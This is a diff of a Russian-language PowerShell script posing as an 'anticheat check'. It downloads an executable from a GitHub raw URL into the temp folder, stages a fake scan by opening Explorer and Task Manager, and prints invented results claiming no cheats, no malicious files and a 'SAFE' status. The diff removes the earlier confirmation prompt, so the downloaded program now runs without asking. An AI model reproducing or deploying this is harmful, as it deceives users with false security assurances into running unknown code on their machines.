@@ -1,78 +1,75 @@
 # Скачиваем программу
 $exeUrl = "https://github.com/gseff137-afk/1111/raw/refs/heads/main/cheker.exe"
 $exePath = "$env:TEMP\cheker.exe"
+Write-Host "Скачивание античита..." -Foreground Yellow
 iwr $exeUrl -OutFile $exePath -UseBasicParsing
+Write-Host "✓ Программа скачана" -Foreground Green
 
-# Симуляция проверки с кнопкой далее
-Add-Type -AssemblyName System.Windows.Forms
+# Начинаем проверку
+Clear-Host
+Write-Host "=========================================" -Foreground Cyan
+Write-Host "     АНТИЧИТ ПРОВЕРКА v2.0" -Foreground White
+Write-Host "=========================================" -Foreground Cyan
+Write-Host ""
+Write-Host "Нажмите ENTER для начала проверки..."
+pause
 
-# Окно приветствия
-[System.Windows.Forms.MessageBox]::Show("Античит система v2.0`nНажмите OK для начала проверки", "Проверка системы", "OK", "Information")
-
-# Симуляция сканирования
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "Сканирование системы"
-$form.Size = New-Object System.Drawing.Size(400,200)
-$form.StartPosition = "CenterScreen"
-
-$label = New-Object System.Windows.Forms.Label
-$label.Location = New-Object System.Drawing.Point(20,20)
-$label.Size = New-Object System.Drawing.Size(350,60)
-$label.Text = "Идет проверка системы на наличие читов...`nПожалуйста, подождите 30 секунд"
-$form.Controls.Add($label)
-
-$progressBar = New-Object System.Windows.Forms.ProgressBar
-$progressBar.Location = New-Object System.Drawing.Point(20,100)
-$progressBar.Size = New-Object System.Drawing.Size(350,30)
-$progressBar.Style = "Marquee"
-$form.Controls.Add($progressBar)
-
-# Запускаем форму в отдельном потоке
-$form.Add_Shown({$form.Activate()})
-$job = Start-Job {
-    $form.ShowDialog()
+# Функция для анимированной точки
+function Show-Dots {
+    param([int]$Seconds)
+    $end = (Get-Date).AddSeconds($Seconds)
+    while ((Get-Date) -lt $end) {
+        Write-Host "." -NoNewline -Foreground Yellow
+        Start-Sleep 1
+    }
+    Write-Host ""
 }
-Start-Sleep 30
 
-# Закрываем форму проверки
-Stop-Job $job
-Remove-Job $job
-
-# Симуляция проверки папок
-Write-Host "`n=== ПРОВЕРКА СИСТЕМЫ ===" -ForegroundColor Cyan
-Write-Host "1. Сканирование диска C:\..." -ForegroundColor Yellow
-Start-Sleep 3
+# Проверка 1
+Write-Host "`n[1/5] Сканирую диск C:\" -Foreground Yellow -NoNewline
+Show-Dots 5
 explorer C:\
-Write-Host "   ✓ Проверено" -ForegroundColor Green
+Write-Host "   ✓ Диск проверен" -Foreground Green
 
-Write-Host "2. Анализ временных файлов..." -ForegroundColor Yellow
-Start-Sleep 3
+# Проверка 2
+Write-Host "`n[2/5] Анализ временных файлов" -Foreground Yellow -NoNewline
+Show-Dots 5
 explorer $env:TEMP
-Write-Host "   ✓ Проверено" -ForegroundColor Green
+Write-Host "   ✓ Temp проверен" -Foreground Green
 
-Write-Host "3. Проверка системных файлов..." -ForegroundColor Yellow
-Start-Sleep 3
+# Проверка 3
+Write-Host "`n[3/5] Проверка системных папок" -Foreground Yellow -NoNewline
+Show-Dots 5
 explorer C:\Windows
-Write-Host "   ✓ Проверено" -ForegroundColor Green
+Write-Host "   ✓ Система проверена" -Foreground Green
 
-Write-Host "4. Мониторинг процессов..." -ForegroundColor Yellow
-Start-Sleep 3
+# Проверка 4
+Write-Host "`n[4/5] Мониторинг процессов" -Foreground Yellow -NoNewline
+Show-Dots 10
 taskmgr
-Write-Host "   ✓ Проверено" -ForegroundColor Green
+Write-Host "   ✓ Процессы проверены" -Foreground Green
 
-Write-Host "5. Финальная проверка..." -ForegroundColor Yellow
-Start-Sleep 5
-Write-Host "`n=== РЕЗУЛЬТАТЫ ====" -ForegroundColor Green
-Write-Host "✓ Читы не обнаружены" -ForegroundColor Green
-Write-Host "✓ Система безопасна" -ForegroundColor Green
-Write-Host "✓ Все проверки пройдены" -ForegroundColor Green
+# Проверка 5
+Write-Host "`n[5/5] Финальный анализ" -Foreground Yellow -NoNewline
+Show-Dots 5
+Write-Host "   ✓ Анализ завершен" -Foreground Green
 
-# Кнопка далее для запуска программы
-$result = [System.Windows.Forms.MessageBox]::Show("Проверка завершена успешно!`nЧиты не обнаружены.`nЗапустить программу?", "Проверка завершена", "YesNo", "Question")
+# Результат
+Write-Host "`n" + ("="*40) -Foreground Green
+Write-Host "ПРОВЕРКА ЗАВЕРШЕНА!" -Foreground White -Background Green
+Write-Host "="*40 -Foreground Green
+Write-Host ""
+Write-Host "Результаты:" -Foreground Cyan
+Write-Host "✓ Читы не обнаружены" -Foreground Green
+Write-Host "✓ Вредоносные файлы: 0" -Foreground Green
+Write-Host "✓ Системные файлы: целы" -Foreground Green
+Write-Host "✓ Процессы: норма" -Foreground Green
+Write-Host ""
+Write-Host "Защита системы: АКТИВНА" -Foreground Green
+Write-Host "Статус: БЕЗОПАСНО" -Foreground Green
+Write-Host ""
 
-if ($result -eq "Yes") {
-    # Запускаем скачанную программу
-    & $exePath
-} else {
-    [System.Windows.Forms.MessageBox]::Show("Программа не будет запущена", "Отменено", "OK", "Information")
-}
+# Запуск программы
+Write-Host "Запускаю программу..." -Foreground Yellow
+Start-Sleep 2
+& $exePath
